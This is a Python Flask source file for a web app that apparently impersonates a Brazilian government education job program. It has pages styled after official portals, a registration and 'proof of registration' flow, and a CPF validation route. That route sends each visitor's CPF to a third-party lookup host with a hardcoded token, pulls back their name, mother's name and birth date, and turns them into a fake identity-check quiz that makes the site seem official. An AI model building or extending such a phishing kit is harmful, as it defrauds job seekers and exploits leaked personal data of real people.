import os
import logging
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from sqlalchemy.orm import DeclarativeBase

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Create the Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key-change-in-production")

# Configure the database
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL")
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}

# Initialize extensions
db.init_app(app)
migrate = Migrate(app, db)

# Define models directly in app.py to avoid import issues
class Program(db.Model):
    """Model for government education programs"""
    __tablename__ = 'programs'
    
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=False)
    ministry = db.Column(db.String(100), nullable=False)
    program_type = db.Column(db.String(50), nullable=False)
    status = db.Column(db.String(20), default='active')
    published_date = db.Column(db.DateTime, default=datetime.utcnow)
    updated_date = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    def __repr__(self):
        return f'<Program {self.title}>'

class Position(db.Model):
    """Model for job positions within programs"""
    __tablename__ = 'positions'
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    requirements = db.Column(db.Text)
    salary_min = db.Column(db.Numeric(10, 2))
    salary_max = db.Column(db.Numeric(10, 2))
    workload_hours = db.Column(db.Integer)
    work_type = db.Column(db.String(50))
    program_id = db.Column(db.Integer, db.ForeignKey('programs.id'), nullable=False)
    
    def __repr__(self):
        return f'<Position {self.name}>'

# Create tables
with app.app_context():
    db.create_all()

@app.route('/')
def index():
    """Main page showing the Mais Agentes da Educação program"""
    # Get program data from database
    program = Program.query.filter_by(title='Mais Agentes da Educação').first()
    positions = Position.query.filter_by(program_id=1).all() if program else []
    
    return render_template('index.html', program=program, positions=positions)

@app.route('/acesso-informacao')
def acesso_informacao():
    """Access to Information page"""
    return render_template('index.html', page_title="Acesso à Informação")

@app.route('/acoes-programas')
def acoes_programas():
    """Actions and Programs page"""
    return render_template('index.html', page_title="Ações e Programas")

@app.route('/programas')
def programas():
    """Programs page"""
    return render_template('index.html', page_title="Programas")

@app.route('/bolsas-auxilios')
def bolsas_auxilios():
    """Scholarships and Aid page"""
    return render_template('index.html', page_title="Bolsas e Auxílios")

@app.route('/lista-programas')
def lista_programas():
    """Programs List page"""
    return render_template('index.html', page_title="Lista de Programas")

@app.route('/search')
def search():
    """Search API endpoint"""
    query = request.args.get('q', '').strip()
    results = []
    
    if query:
        # Search in programs
        programs = Program.query.filter(
            db.or_(
                Program.title.ilike(f'%{query}%'),
                Program.description.ilike(f'%{query}%'),
                Program.ministry.ilike(f'%{query}%'),
                Program.program_type.ilike(f'%{query}%')
            )
        ).filter_by(status='active').all()
        
        # Search in positions
        positions = Position.query.filter(
            db.or_(
                Position.name.ilike(f'%{query}%'),
                Position.description.ilike(f'%{query}%'),
                Position.requirements.ilike(f'%{query}%'),
                Position.work_type.ilike(f'%{query}%')
            )
        ).all()
        
        # Format results
        for program in programs:
            results.append({
                'type': 'program',
                'title': program.title,
                'description': program.description[:200] + '...' if len(program.description) > 200 else program.description,
                'ministry': program.ministry,
                'url': '/',
                'date': program.published_date.strftime('%d/%m/%Y') if program.published_date else ''
            })
        
        for position in positions:
            results.append({
                'type': 'position',
                'title': position.name,
                'description': position.description[:200] + '...' if position.description and len(position.description) > 200 else position.description or '',
                'salary': f'R$ {position.salary_min} - R$ {position.salary_max}' if position.salary_min and position.salary_max else '',
                'work_type': position.work_type,
                'url': '/',
                'workload': f'{position.workload_hours}h' if position.workload_hours else ''
            })
    
    return jsonify({
        'query': query,
        'total_results': len(results),
        'results': results
    })

@app.route('/busca')
def busca():
    """Search results page"""
    query = request.args.get('q', '').strip()
    results = []
    total_results = 0
    
    if query:
        # Get search results using the same logic as the API
        search_response = search()
        search_data = search_response.get_json()
        results = search_data['results']
        total_results = search_data['total_results']
    
    return render_template('search_results.html', 
                         query=query, 
                         results=results, 
                         total_results=total_results)

@app.route('/cadastro')
def cadastro():
    """Registration page for PNAE program"""
    return render_template('cadastro.html', page_title="Cadastro - Mais Agentes da Educação")

@app.route('/resultados-busca')
def resultados_busca():
    """Results page showing available positions in the region"""
    cep = request.args.get('cep', '').strip()
    if not cep:
        return render_template('cadastro.html', page_title="Cadastro - Mais Agentes da Educação")
    
    # Generate region code based on CEP
    region_code = f"REG-{cep[:2]}-{cep[2:5]}"
    
    return render_template('resultados_busca.html', 
                         page_title="Resultados da Busca - Mais Agentes da Educação",
                         cep=cep,
                         region_code=region_code)

@app.route('/buscar-escolas')
def buscar_escolas():
    """Search for schools near a given CEP"""
    cep = request.args.get('cep', '').strip()
    if not cep:
        return jsonify({'error': 'CEP é obrigatório'}), 400
    
    # For now, return mock data - we'll need Google Places API key for real data
    escolas = [
        {
            'nome': 'Escola Municipal João Silva',
            'endereco': 'Rua das Flores, 123 - Centro',
            'distancia': '0.5 km',
            'telefone': '(11) 3456-7890'
        },
        {
            'nome': 'Escola Municipal Maria Santos',
            'endereco': 'Av. Principal, 456 - Bairro Novo', 
            'distancia': '1.2 km',
            'telefone': '(11) 3456-7891'
        },
        {
            'nome': 'Escola Municipal Pedro Oliveira',
            'endereco': 'Rua da Educação, 789 - Vila Esperança',
            'distancia': '2.1 km', 
            'telefone': '(11) 3456-7892'
        }
    ]
    
    return jsonify({'escolas': escolas})

@app.route('/formulario-inscricao')
def formulario_inscricao():
    """Registration form page - CPF step"""
    return render_template('formulario_inscricao.html', page_title="Formulário de Inscrição - Mais Agentes da Educação")

@app.route('/validar-cpf', methods=['POST'])
def validar_cpf():
    """Validate CPF and get user data from API"""
    import requests
    import random
    from datetime import datetime, timedelta
    
    data = request.get_json()
    cpf = data.get('cpf', '').replace('.', '').replace('-', '')
    
    if not cpf or len(cpf) != 11:
        return jsonify({'error': 'CPF inválido'}), 400
    
    try:
        # Consultar API de CPF
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf={cpf}"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code != 200:
            return jsonify({'error': 'Erro ao consultar dados do CPF'}), 400
        
        dados_api = response.json()
        
        if 'DADOS' not in dados_api:
            return jsonify({'error': 'CPF não encontrado na base de dados'}), 404
        
        dados_usuario = dados_api['DADOS']
        nome_completo = dados_usuario.get('nome', '')
        nome_mae = dados_usuario.get('nome_mae', '')
        data_nascimento = dados_usuario.get('data_nascimento', '')
        
        # Gerar primeiro nome para o cabeçalho
        primeiro_nome = nome_completo.split()[0] if nome_completo else 'Usuário'
        
        # Gerar opções falsas para o quiz
        nomes_falsos = [
            "CARLOS EDUARDO SILVA",
            "MARIA FERNANDA SANTOS",
            "JOÃO PEDRO OLIVEIRA",
            "ANA CAROLINA SOUZA",
            "RAFAEL HENRIQUE COSTA",
            "JULIANA ALVES PEREIRA"
        ]
        
        maes_falsas = [
            "MARIA SILVA SANTOS",
            "REGINA OLIVEIRA COSTA",
            "CARMEN SOUZA PEREIRA",
            "HELENA FERNANDES LIMA",
            "BEATRIZ ALMEIDA ROCHA",
            "LUCIANA TORRES MENDOZA"
        ]
        
        # Gerar datas falsas (variação de ±10 anos)
        if data_nascimento:
            try:
                data_original = datetime.strptime(data_nascimento, '%Y-%m-%d %H:%M:%S')
                datas_falsas = []
                for i in range(5):
                    anos_diff = random.randint(-10, 10)
                    meses_diff = random.randint(-6, 6)
                    dias_diff = random.randint(-15, 15)
                    
                    nova_data = data_original + timedelta(days=anos_diff*365 + meses_diff*30 + dias_diff)
                    datas_falsas.append(nova_data.strftime('%Y-%m-%d %H:%M:%S'))
            except:
                datas_falsas = [
                    "1980-03-15 00:00:00",
                    "1985-07-22 00:00:00",
                    "1990-11-08 00:00:00",
                    "1995-02-14 00:00:00",
                    "1988-09-30 00:00:00"
                ]
        else:
            datas_falsas = [
                "1980-03-15 00:00:00",
                "1985-07-22 00:00:00",
                "1990-11-08 00:00:00"
            ]
        
        # Criar quiz com 3 opções cada
        quiz_nomes = random.sample(nomes_falsos, 2) + [nome_completo]
        random.shuffle(quiz_nomes)
        
        quiz_maes = random.sample(maes_falsas, 2) + [nome_mae]
        random.shuffle(quiz_maes)
        
        quiz_datas = random.sample(datas_falsas, 2) + [data_nascimento]
        random.shuffle(quiz_datas)
        
        return jsonify({
            'sucesso': True,
            'primeiro_nome': primeiro_nome,
            'dados_originais': {
                'nome': nome_completo,
                'nome_mae': nome_mae,
                'data_nascimento': data_nascimento,
                'cpf': cpf
            },
            'quiz': {
                'nomes': quiz_nomes,
                'maes': quiz_maes,
                'datas': quiz_datas
            }
        })
        
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Erro na API de CPF: {e}")
        return jsonify({'error': 'Erro de conexão com o serviço de validação'}), 500
    except Exception as e:
        app.logger.error(f"Erro inesperado: {e}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/comprovante-inscricao')
def comprovante_inscricao():
    """Proof of registration page"""
    return render_template('comprovante_inscricao.html', page_title="Comprovante de Inscrição - Mais Agentes da Educação")

@app.route('/login')
def login():
    """Login page (mock interface)"""
    return render_template('index.html', page_title="Login")

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return render_template('index.html', page_title="Página não encontrada"), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    return render_template('index.html', page_title="Erro interno do servidor"), 500

if __name__ == '__main__':
    # Run the app on port 5000 for local development
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
